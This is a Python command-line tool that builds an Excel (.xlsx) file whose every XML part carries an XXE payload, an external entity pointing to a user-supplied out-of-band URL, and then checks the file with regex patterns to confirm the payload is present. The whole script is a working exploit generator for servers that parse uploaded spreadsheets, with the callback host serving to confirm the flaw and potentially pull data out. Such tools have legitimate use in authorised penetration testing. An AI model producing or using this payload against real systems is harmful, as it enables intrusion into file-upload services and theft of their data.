import os
import shutil
import zipfile
import re
import argparse

LANG_MESSAGES = {
    "en": {
        "start": "[+] Excel file with XXE payload created:",
        "verify": "[+] Verification started:",
        "found": "[++] Payload found:",
        "not_found": "[ ] Clean:",
        "how_to": "    -> To inspect manually:",
        "how_to_step1": "      1. Rename the .xlsx file to .zip",
        "how_to_step2": "      2. Open → extract and read:"
    },
    "fr": {
        "start": "[+] Fichier Excel avec payload XXE créé:",
        "verify": "[+] Vérification lancée:",
        "found": "[+] Payload détecté:",
        "not_found": "[ ] Sain:",
        "how_to": "    > Pour inspection manuelle:",
        "how_to_step1": "      1. Renommez le fichier .xlsx en .zip",
        "how_to_step2": "      2. Ouvrir → extraire et lire:"
    }
}

def create_xxe_excel(output_filename, oob_url, lang):
    temp_dir = "temp_excel"
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(os.path.join(temp_dir, "xl", "worksheets"))
    os.makedirs(os.path.join(temp_dir, "xl", "_rels"))
    os.makedirs(os.path.join(temp_dir, "_rels"))
    os.makedirs(os.path.join(temp_dir, "xl", "theme"))

    xxe_header = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"{oob_url}\">]>\n'''

    files_to_create = {
        '[Content_Types].xml': f'''{xxe_header}
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    &xxe;
    <Default Extension="xml" ContentType="application/xml"/>
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
    <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
    <Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
    <Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>
    <Override PartName="/xl/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>
</Types>''',

        '_rels/.rels': f'''{xxe_header}
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    &xxe;
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>''',

        'xl/workbook.xml': f'''{xxe_header}
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    &xxe;
    <sheets>
        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>''',

        'xl/_rels/workbook.xml.rels': f'''{xxe_header}
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    &xxe;
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
    <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
    <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
</Relationships>''',

        'xl/worksheets/sheet1.xml': f'''{xxe_header}
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    &xxe;
    <sheetData>
        <row r="1">
            <c r="A1" t="s"><v>0</v></c>
        </row>
    </sheetData>
</worksheet>''',

        'xl/sharedStrings.xml': f'''{xxe_header}
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
    &xxe;
    <si><t>Injected XXE String</t></si>
</sst>''',

        'xl/styles.xml': f'''{xxe_header}
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    &xxe;
    <fonts count="1"><font><sz val="11"/><color theme="1"/><name val="Calibri"/></font></fonts>
    <fills count="1"><fill><patternFill patternType="none"/></fill></fills>
    <borders count="1"><border/></borders>
    <cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>
    <cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellXfs>
</styleSheet>''',

        'xl/theme/theme1.xml': f'''{xxe_header}
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">
    &xxe;
    <a:themeElements>
        <a:clrScheme name="Office">
            <a:dk1><a:sysClr val="windowText" lastClr="000000"/></a:dk1>
            <a:lt1><a:sysClr val="window" lastClr="FFFFFF"/></a:lt1>
        </a:clrScheme>
    </a:themeElements>
</a:theme>'''
    }

    for path, content in files_to_create.items():
        full_path = os.path.join(temp_dir, path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content)

    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(temp_dir):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, temp_dir)
                zipf.write(full_path, arcname)

    shutil.rmtree(temp_dir)
    print(f"\n{LANG_MESSAGES[lang]['start']} {output_filename}\n")
    inspect_excel_for_xxe(output_filename, lang)

def inspect_excel_for_xxe(xlsx_path, lang):
    patterns = [
        re.compile(r'<!ENTITY\\s+xxe\\s+SYSTEM\\s+\"([^\"]+)\"', re.IGNORECASE),
        re.compile(r'&xxe;', re.IGNORECASE),
        re.compile(r'SYSTEM\\s+\"([^\"]+)\"', re.IGNORECASE)
    ]

    print(f"{LANG_MESSAGES[lang]['verify']} {xlsx_path}\n")

    with zipfile.ZipFile(xlsx_path, 'r') as zipf:
        for name in zipf.namelist():
            if name.endswith('.xml'):
                content = zipf.read(name).decode(errors='ignore')
                found = False
                for pattern in patterns:
                    if pattern.search(content):
                        print(f"{LANG_MESSAGES[lang]['found']} {name}")
                        print(LANG_MESSAGES[lang]['how_to'])
                        print(LANG_MESSAGES[lang]['how_to_step1'])
                        print(f"{LANG_MESSAGES[lang]['how_to_step2']} {name}\n")
                        found = True
                        break
                if not found:
                    print(f"{LANG_MESSAGES[lang]['not_found']} {name}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XXE Excel generator with multilingual output")
    parser.add_argument("output_filename", help="Output .xlsx file name")
    parser.add_argument("oob_url", help="Your OOB XXE URL")
    parser.add_argument("--lang", choices=["en", "fr"], default="en", help="Language for output messages")
    args = parser.parse_args()
    create_xxe_excel(args.output_filename, args.oob_url, args.lang)
